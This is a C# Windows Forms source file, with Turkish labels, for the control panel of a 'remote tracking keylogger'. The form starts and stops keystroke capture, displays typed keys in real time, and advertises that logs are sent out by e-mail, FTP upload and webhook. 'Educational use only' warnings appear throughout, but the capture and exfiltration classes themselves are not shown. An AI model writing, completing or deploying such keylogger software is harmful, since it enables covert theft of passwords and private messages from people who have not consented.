using System;
using System.Drawing;
using System.Windows.Forms;
using DevExpress.XtraEditors;

namespace GameOdev
{
    /// <summary>
    /// Uzaktan takip özellikli ana form
    /// Eğitim amaçlı - izinli kullanım için
    /// </summary>
    public partial class RemoteForm : DevExpress.XtraEditors.XtraForm
    {
        private RemoteKeyLogger remoteKeyLogger;
        private bool isLogging = false;

        public RemoteForm()
        {
            InitializeComponent();
            InitializeRemoteKeyLogger();
            SetupRemoteUI();
            LoadConfigurationStatus();
        }

        private void InitializeRemoteKeyLogger()
        {
            remoteKeyLogger = new RemoteKeyLogger();
        }

        private void SetupRemoteUI()
        {
            // Form özellikleri
            this.Text = "🔍 Uzaktan Takip KeyLogger - Eğitim Amaçlı";
            this.Size = new Size(1000, 700);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            // Ana uyarı etiketi
            Label warningLabel = new Label();
            warningLabel.Text = "⚠️ UYARI: Bu yazılım sadece EĞİTİM amaçlıdır!\n" +
                               "Sadece açık yazılı izin alınmış kişilerde kullanın.\n" +
                               "İzinsiz kullanım yasalara aykırıdır.";
            warningLabel.ForeColor = Color.Red;
            warningLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            warningLabel.Size = new Size(950, 80);
            warningLabel.Location = new Point(25, 20);
            warningLabel.TextAlign = ContentAlignment.TopCenter;
            this.Controls.Add(warningLabel);

            // Kontrol paneli
            Panel controlPanel = new Panel();
            controlPanel.Size = new Size(950, 80);
            controlPanel.Location = new Point(25, 110);
            controlPanel.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(controlPanel);

            // Start/Stop butonu
            SimpleButton startStopButton = new SimpleButton();
            startStopButton.Name = "startStopButton";
            startStopButton.Text = "🚀 Uzaktan Takibi Başlat";
            startStopButton.Size = new Size(150, 40);
            startStopButton.Location = new Point(20, 20);
            startStopButton.Click += StartStopButton_Click;
            controlPanel.Controls.Add(startStopButton);

            // Konfigürasyon butonu
            SimpleButton configButton = new SimpleButton();
            configButton.Text = "⚙️ Konfigürasyon";
            configButton.Size = new Size(120, 40);
            configButton.Location = new Point(180, 20);
            configButton.Click += ConfigButton_Click;
            controlPanel.Controls.Add(configButton);

            // Durum butonu
            SimpleButton statusButton = new SimpleButton();
            statusButton.Text = "📊 Durum";
            statusButton.Size = new Size(100, 40);
            statusButton.Location = new Point(310, 20);
            statusButton.Click += StatusButton_Click;
            controlPanel.Controls.Add(statusButton);

            // Temizle butonu
            SimpleButton clearButton = new SimpleButton();
            clearButton.Text = "🗑️ Temizle";
            clearButton.Size = new Size(100, 40);
            clearButton.Location = new Point(420, 20);
            clearButton.Click += ClearButton_Click;
            controlPanel.Controls.Add(clearButton);

            // Durum etiketi
            Label statusLabel = new Label();
            statusLabel.Name = "statusLabel";
            statusLabel.Text = "Durum: Durduruldu";
            statusLabel.Size = new Size(200, 30);
            statusLabel.Location = new Point(530, 30);
            statusLabel.ForeColor = Color.Blue;
            statusLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            controlPanel.Controls.Add(statusLabel);

            // Konfigürasyon durumu paneli
            Panel configPanel = new Panel();
            configPanel.Name = "configPanel";
            configPanel.Size = new Size(950, 120);
            configPanel.Location = new Point(25, 200);
            configPanel.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(configPanel);

            // Konfigürasyon etiketi
            Label configLabel = new Label();
            configLabel.Text = "🔧 Uzaktan Takip Konfigürasyonu:";
            configLabel.Size = new Size(300, 25);
            configLabel.Location = new Point(10, 10);
            configLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            configPanel.Controls.Add(configLabel);

            // Konfigürasyon durumu
            Label configStatusLabel = new Label();
            configStatusLabel.Name = "configStatusLabel";
            configStatusLabel.Text = "Konfigürasyon yükleniyor...";
            configStatusLabel.Size = new Size(920, 80);
            configStatusLabel.Location = new Point(10, 35);
            configStatusLabel.Font = new Font("Consolas", 9);
            configPanel.Controls.Add(configStatusLabel);

            // Tuş vuruşları paneli
            Panel keystrokePanel = new Panel();
            keystrokePanel.Size = new Size(950, 350);
            keystrokePanel.Location = new Point(25, 330);
            keystrokePanel.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(keystrokePanel);

            // Tuş vuruşları etiketi
            Label keystrokeLabel = new Label();
            keystrokeLabel.Text = "⌨️ Gerçek Zamanlı Tuş Vuruşları:";
            keystrokeLabel.Size = new Size(250, 25);
            keystrokeLabel.Location = new Point(10, 10);
            keystrokeLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            keystrokePanel.Controls.Add(keystrokeLabel);

            // Tuş vuruşları metin kutusu
            TextEdit keystrokeTextBox = new TextEdit();
            keystrokeTextBox.Name = "keystrokeTextBox";
            keystrokeTextBox.Size = new Size(920, 300);
            keystrokeTextBox.Location = new Point(10, 40);
            keystrokeTextBox.Properties.ReadOnly = true;
            keystrokeTextBox.Properties.UseAdvancedMode = DevExpress.Utils.DefaultBoolean.True;
            keystrokeTextBox.Properties.Appearance.TextOptions.WordWrap = DevExpress.Utils.WordWrap.Wrap;
            keystrokeTextBox.Properties.Appearance.TextOptions.VAlignment = DevExpress.Utils.VertAlignment.Top;
            keystrokeTextBox.Properties.Appearance.TextOptions.Trimming = DevExpress.Utils.Trimming.None;
            keystrokeTextBox.Properties.ScrollBars = ScrollBars.Vertical;
            keystrokePanel.Controls.Add(keystrokeTextBox);

            // Bilgi etiketi
            Label infoLabel = new Label();
            infoLabel.Text = "📁 Log dosyası: Masaüstü\\EducationalKeyLogger.txt | 📧 E-posta gönderimi aktif | 🌐 FTP yükleme aktif";
            infoLabel.Size = new Size(950, 30);
            infoLabel.Location = new Point(25, 690);
            infoLabel.ForeColor = Color.Gray;
            infoLabel.Font = new Font("Arial", 8);
            this.Controls.Add(infoLabel);
        }

        private void LoadConfigurationStatus()
        {
            try
            {
                Label configStatusLabel = this.Controls.Find("configStatusLabel", true)[0] as Label;
                if (configStatusLabel != null)
                {
                    configStatusLabel.Text = remoteKeyLogger.GetConfigurationStatus();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Konfigürasyon yükleme hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void StartStopButton_Click(object sender, EventArgs e)
        {
            if (!isLogging)
            {
                // İzin onayı
                DialogResult result = MessageBox.Show(
                    "⚠️ UZAKTAN TAKİP BAŞLATMA UYARISI!\n\n" +
                    "Bu keylogger uzaktan takip özelliklerine sahiptir:\n" +
                    "📧 E-posta ile log gönderimi\n" +
                    "🌐 FTP ile uzaktan yükleme\n" +
                    "📱 Webhook ile anlık bildirim\n\n" +
                    "Sadece eğitim amaçlı ve açık izin ile kullanın!\n\n" +
                    "Devam etmek istiyor musunuz?",
                    "Uzaktan Takip Onayı",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);

                if (result == DialogResult.Yes)
                {
                    remoteKeyLogger.StartLogging();
                    isLogging = true;

                    SimpleButton button = sender as SimpleButton;
                    button.Text = "⏹️ Uzaktan Takibi Durdur";
                    button.BackColor = Color.LightCoral;

                    Label statusLabel = this.Controls.Find("statusLabel", true)[0] as Label;
                    statusLabel.Text = "Durum: Uzaktan Takip Aktif";
                    statusLabel.ForeColor = Color.Red;
                }
            }
            else
            {
                remoteKeyLogger.StopLogging();
                isLogging = false;

                SimpleButton button = sender as SimpleButton;
                button.Text = "🚀 Uzaktan Takibi Başlat";
                button.BackColor = SystemColors.Control;

                Label statusLabel = this.Controls.Find("statusLabel", true)[0] as Label;
                statusLabel.Text = "Durum: Durduruldu";
                statusLabel.ForeColor = Color.Blue;
            }
        }

        private void ConfigButton_Click(object sender, EventArgs e)
        {
            ConfigForm configForm = new ConfigForm(remoteKeyLogger);
            if (configForm.ShowDialog() == DialogResult.OK)
            {
                LoadConfigurationStatus();
                MessageBox.Show("Konfigürasyon güncellendi!", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void StatusButton_Click(object sender, EventArgs e)
        {
            string status = remoteKeyLogger.GetConfigurationStatus();
            MessageBox.Show(status, "Uzaktan Takip Durumu", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void ClearButton_Click(object sender, EventArgs e)
        {
            remoteKeyLogger.ClearBuffer();
            
            TextEdit keystrokeTextBox = this.Controls.Find("keystrokeTextBox", true)[0] as TextEdit;
            keystrokeTextBox.Text = "";
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (isLogging)
            {
                remoteKeyLogger.StopLogging();
            }
            remoteKeyLogger?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
